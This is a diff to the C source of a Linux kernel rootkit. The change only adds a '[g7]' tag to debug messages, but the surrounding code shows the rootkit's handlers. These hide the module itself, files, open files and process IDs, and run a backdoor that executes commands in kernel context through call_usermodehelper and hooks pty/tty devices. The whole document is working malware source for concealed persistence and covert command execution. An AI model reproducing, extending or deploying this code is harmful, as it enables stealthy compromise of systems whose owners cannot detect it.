@@ -86,7 +86,7 @@ handle_modhide(unsigned long arg)
             NULL
         };
 
-        DEBUG_NOTICE("unloading module\n");
+        DEBUG_NOTICE("[g7] unloading module\n");
 
         unhide_module();
         rootkit.hiding_module = 0;
@@ -96,12 +96,12 @@ handle_modhide(unsigned long arg)
         unhide_module();
         rootkit.hiding_module = 0;
 
-        DEBUG_NOTICE("modhide off\n");
+        DEBUG_NOTICE("[g7] modhide off\n");
     } else if (sarg > 0) {
         hide_module();
         rootkit.hiding_module = 1;
 
-        DEBUG_NOTICE("modhide on\n");
+        DEBUG_NOTICE("[g7] modhide on\n");
     }
 
     return 0;
@@ -121,7 +121,7 @@ handle_filehide(unsigned long arg)
         rootkit.hiding_files = 0;
     }
 
-    DEBUG_NOTICE("filehide %s\n", rootkit.hiding_files ? "on" : "off");
+    DEBUG_NOTICE("[g7] filehide %s\n", rootkit.hiding_files ? "on" : "off");
 
     return 0;
 }
@@ -140,7 +140,7 @@ handle_openhide(unsigned long arg)
         rootkit.hiding_open = 0;
     }
 
-    DEBUG_NOTICE("openhide %s\n", rootkit.hiding_open ? "on" : "off");
+    DEBUG_NOTICE("[g7] openhide %s\n", rootkit.hiding_open ? "on" : "off");
 
     return 0;
 }
@@ -153,19 +153,19 @@ handle_pidhide(unsigned long arg)
     if (!sarg) {
         unhide_pids();
         rootkit.hiding_pids = 0;
-        DEBUG_NOTICE("pidhide off\n");
+        DEBUG_NOTICE("[g7] pidhide off\n");
     } else if (sarg < 0) {
         unhide_pid((pid_t)(-sarg));
-        DEBUG_NOTICE("unhiding pid %ld\n", -sarg);
+        DEBUG_NOTICE("[g7] unhiding pid %ld\n", -sarg);
     } else if (sarg > 0) {
         if (!rootkit.hiding_pids) {
             hide_pids();
-            DEBUG_NOTICE("pidhide on\n");
+            DEBUG_NOTICE("[g7] pidhide on\n");
         }
 
         hide_pid((pid_t)sarg);
         rootkit.hiding_pids = 1;
-        DEBUG_NOTICE("hiding pid %ld\n", sarg);
+        DEBUG_NOTICE("[g7] hiding pid %ld\n", sarg);
     }
 
     return 0;
@@ -195,7 +195,7 @@ handle_backdoor(unsigned long arg)
         NULL
     };
 
-    DEBUG_INFO("executing %s\n", buf);
+    DEBUG_INFO("[g7] executing %s\n", buf);
 
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     return 0;
@@ -223,7 +223,7 @@ handle_togglebd(unsigned long arg)
         msg = "hooked into `{p,t}ty`";
     }
 
-    DEBUG_NOTICE("backdoor %s\n", msg);
+    DEBUG_NOTICE("[g7] backdoor %s\n", msg);
 
     return 0;
 }
